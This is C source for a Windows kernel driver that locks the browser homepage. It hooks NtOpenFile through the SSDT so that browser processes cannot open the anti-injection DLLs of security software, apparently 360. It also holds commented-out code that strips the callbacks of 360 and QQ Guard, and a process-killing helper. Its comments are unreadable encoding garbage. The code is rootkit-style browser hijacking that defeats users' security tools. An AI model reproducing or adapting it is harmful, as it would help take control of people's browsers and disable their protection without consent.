
#include <ntifs.h>
#include <ntstrsafe.h>

#include "LockHomePage.h"
#include "IoControl.h"
#include "ToolFunction.h"
#include "InlineHook.h"


////////////////////////////////////////////////////////////////////////////////////////////
// ����������
//
// 1) HOOK NtOpenFile, ��ֹ360ģ�������������ע��(���߳������Բ��Ϲҹ�,��ֹ��ժ)
// 2) �޸���������������в���
//
////////////////////////////////////////////////////////////////////////////////////////////

//
// ȫ��������Ϣ
//
WCHAR g_LockedURL[MAX_URL_LENGTH] = L"http://www.pediy.com";

HOOKID g_NtOpenFileHookId = INVALID_HOOKID;



//���� SSDT
typedef struct _KSERVICE_TABLE_DESCRIPTOR {
	PULONG_PTR Base;
	PULONG Count;
	ULONG Limit;
	PUCHAR Number;
} KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;

extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;



NTSTATUS LhpSetLockInfo(PWSTR LockedURL)
{
	NTSTATUS Status = STATUS_SUCCESS;

	RtlZeroMemory(g_LockedURL, sizeof(g_LockedURL));
	Status = RtlStringCbCopyNW(g_LockedURL, sizeof(g_LockedURL), LockedURL, MAX_URL_LENGTH);

	return Status;
}


//////////////////////////////////////////////////////////////////////////
// ��ע���ļ����ʼ��
//////////////////////////////////////////////////////////////////////////
NTSTATUS LhpBdaiCheckCreateFile(IN PUNICODE_STRING usFileName)
{
	NTSTATUS Status = STATUS_SUCCESS;
	PLIST_ENTRY Entry = NULL;
	WCHAR szCurrentProcess[MAX_PATH] = {0};
	ULONG bufLen = _countof(szCurrentProcess);
	WCHAR szFileName[MAX_PATH] = {0};
	ULONG Index = 0;

	RtlStringCbCopyUnicodeString(szFileName, sizeof(szFileName), usFileName);
	_wcslwr(szFileName);

	LhpGetProcessImageNameByProcessId(PsGetCurrentProcessId(), szCurrentProcess, &bufLen);
	_wcslwr(szCurrentProcess);


	//
	// ���̹���
	//
	for (Index = 0; Index < _countof(g_AllBrowsersNameList); Index++)
	{
		if (wcsstr(szCurrentProcess, g_AllBrowsersNameList[Index]) != NULL)
			break;
	}

	if (Index == _countof(g_AllBrowsersNameList))
	{
		return STATUS_SUCCESS;
	}


	//
	// �ļ�����
	//
	for (Index = 0; Index < _countof(g_AllAntiInjectDllNameList); Index++)
	{
		if (wcsstr(szFileName, g_AllAntiInjectDllNameList[Index]) != NULL)
			break;
	}

	if (Index == _countof(g_AllAntiInjectDllNameList))
	{
		return STATUS_SUCCESS;
	}

	return STATUS_ACCESS_DENIED;
}



//////////////////////////////////////////////////////////////////////////
// �����ļ��ҹ����2: NtOpenFile
//////////////////////////////////////////////////////////////////////////

typedef
NTSTATUS (NTAPI *PFNNtOpenFile)(
    OUT PHANDLE  FileHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes,
    OUT PIO_STATUS_BLOCK  IoStatusBlock,
    IN ULONG  ShareAccess,
    IN ULONG  OpenOptions
    );

NTSTATUS
NTAPI
LhpHookPrevNtOpenFile(
    OUT PHANDLE  FileHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes,
    OUT PIO_STATUS_BLOCK  IoStatusBlock,
    IN ULONG  ShareAccess,
    IN ULONG  OpenOptions
    )
{
	NTSTATUS Status = STATUS_SUCCESS;


	do 
	{
		if (KeGetCurrentIrql() != PASSIVE_LEVEL){
			break;
		}

		if (ExGetPreviousMode() != UserMode){
			break;
		}

		if (!ObjectAttributes || !ObjectAttributes->ObjectName){
			break;
		}

		//
		// �����ע����
		//
		__try
		{
			Status = LhpBdaiCheckCreateFile(ObjectAttributes->ObjectName);
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			Status = STATUS_SUCCESS;
		}

	} while (FALSE);


	//
	// �����������ԭ����
	//
	if (NT_SUCCESS(Status))
	{
		PVOID OriginFunAddress = LhpHookGetOriginFunAddress(g_NtOpenFileHookId);
		if (OriginFunAddress)
		{
			Status = ((PFNNtOpenFile)OriginFunAddress)(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
		}
		else
		{
			Status = STATUS_UNSUCCESSFUL;
		}
	}

	return Status;
}

//
// ������ʼ��
//
NTSTATUS LhpLockInit()
{
	ESystemVersion SystemVersion = 0;
	ULONG NtOpenFileServiceNumber = 0;
	PVOID NtOpenFileAddress = NULL;

	//DbgBreakPoint();

	LhpGetSystemVersion(&SystemVersion);
	if (SystemVersion == e_Windows_XP)
	{
		NtOpenFileServiceNumber = 0x74;
	}
	else if (SystemVersion == e_Windows_7)
	{
		NtOpenFileServiceNumber = 0xB3;
	}
	else
	{
		return STATUS_NOT_SUPPORTED;
	}

	NtOpenFileAddress = (PVOID)(KeServiceDescriptorTable->Base[NtOpenFileServiceNumber]);
	//
	// ������Լ��һ�� NtOpenFileAddress �Ƿ���ntoskrn.exe�ļ��ؿռ���
	//


	//
	// ��װHOOK
	//
	LhpHookModuleInit();

	g_NtOpenFileHookId = LhpHookInstallHook(NtOpenFileAddress, LhpHookPrevNtOpenFile);
	if (g_NtOpenFileHookId == INVALID_HOOKID)
	{
		 LhpHookModuleUninit();
		 return STATUS_UNSUCCESSFUL;
	}

	//
	// ժ��360��Q�ܵȵĻص�
	//
	/*
	if (NT_SUCCESS(LhpRemoveModuleLoadImageCallback(L"xx")))
	{
		KdPrint(("/------LhpRemoveModuleLoadImageCallback() �ɹ�------/\n"));
	}
	else
	{
		KdPrint(("/------LhpRemoveModuleLoadImageCallback() ʧ��------/\n"));
	}

	if (NT_SUCCESS(LhpRemoveModuleLoadImageCallback(L"xx")))
	{
		KdPrint(("/------LhpRemoveModuleLoadImageCallback() �ɹ�------/\n"));
	}
	else
	{
		KdPrint(("/------LhpRemoveModuleLoadImageCallback() ʧ��------/\n"));
	}
	*/
	

	//
	// �������Ӽ���߳�
	//

	return STATUS_SUCCESS;
}


NTSTATUS LhpLockUninit()
{
	//
	// ֪ͨ���Ӽ���߳��˳�
	//


	//
	// �ָ�HOOK
	//
	LhpHookUninstallHook(g_NtOpenFileHookId);
	LhpHookModuleUninit();

	return STATUS_SUCCESS;
}

//
// �������̷�ʽ����
//
NTSTATUS LhpRestartProcess(ULONG Pid)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	HANDLE hProcess = NULL;
	CLIENT_ID Cid = {(HANDLE)Pid, 0};
	OBJECT_ATTRIBUTES OA;
	RtlZeroMemory(&OA, sizeof(OA));
	OA.Length = sizeof(OA);

	Status = ZwOpenProcess(&hProcess, 0x01/*PROCESS_TERMINATE*/, &OA, &Cid);
	if (NT_SUCCESS(Status))
	{
		ZwTerminateProcess(hProcess, 0);
		ZwClose(hProcess);
	}

	return Status;
}